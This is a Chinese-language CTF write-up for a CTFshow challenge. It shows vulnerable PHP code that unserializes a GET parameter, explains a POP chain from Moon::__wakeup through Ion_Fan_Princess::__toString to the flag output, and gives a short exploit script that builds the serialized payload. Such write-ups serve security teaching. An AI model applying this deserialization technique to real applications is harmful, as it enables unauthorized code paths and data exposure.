# POP链记录2

CTFshow“菜狗杯”中的一道题目。

![image-20221115185826258](https://yvling-typora-image-1257337367.cos.ap-nanjing.myqcloud.com/typora/image-20221115185826258.png)





**分析源码**

```php
<?php
include "flag.php";
highlight_file(__FILE__);

class Moon{
    public $name="月亮";
    public function __toString(){
        return $this->name;
    }
    
    public function __wakeup(){
        echo "我是".$this->name."快来赏我";
    }
}

class Ion_Fan_Princess{
    public $nickname="牛夫人";

    public function call(){
        global $flag;
        if ($this->nickname=="小甜甜"){
            echo $flag;
        }else{
            echo "以前陪我看月亮的时候，叫人家小甜甜！现在新人胜旧人，叫人家".$this->nickname."。\n";
            echo "你以为我这么辛苦来这里真的是为了这条臭牛吗?是为了你这个没良心的臭猴子啊!\n";
        }
    }
    
    public function __toString(){
        $this->call();
        return "\t\t\t\t\t\t\t\t\t\t----".$this->nickname;
    }
}

if (isset($_GET['code'])){
    unserialize($_GET['code']);

}else{
    $a=new Ion_Fan_Princess();
    echo $a;
}
```



**构造流程**

```
1. 获取GET请求参数 'code'，并将code反序列化。
2. 反序列化时最先触发__wakeup函数，在Moon类中有这一函数。
3. 在__wakeup函数中，echo语句将当前对象的成员变量name当作字符串输出，若这里的变量name是某个类的对象，则会触发__toString函数。
4. 这里两个类都有__toString函数，但观察到，Ion_Fan_Princess类中的__toString函数调用了call函数，而call函数有读取flag的操作，所以这里应当将Moon类中的变量name设置成Ion_Fan_Princess类的对象
5. 观察Ion_Fan_Princess类中的call函数，当nickname的值为“小甜甜”时读取flag，所以这里要设置一下。
```



**编写exp**

```php
<?php
class Moon{
    public $name;
}

class Ion_Fan_Princess{
    public $nickname;
}

$moon = new Moon();
$ion = new Ion_Fan_Princess();

$ion->nickname = "小甜甜";
$moon->name = $ion;

echo serialize($moon);
```

获得payload：

![image-20221115202416081](https://yvling-typora-image-1257337367.cos.ap-nanjing.myqcloud.com/typora/image-20221115202416081.png)

传入即可：

![image-20221115202440859](https://yvling-typora-image-1257337367.cos.ap-nanjing.myqcloud.com/typora/image-20221115202440859.png)

![image-20221115202349560](https://yvling-typora-image-1257337367.cos.ap-nanjing.myqcloud.com/typora/image-20221115202349560.png)





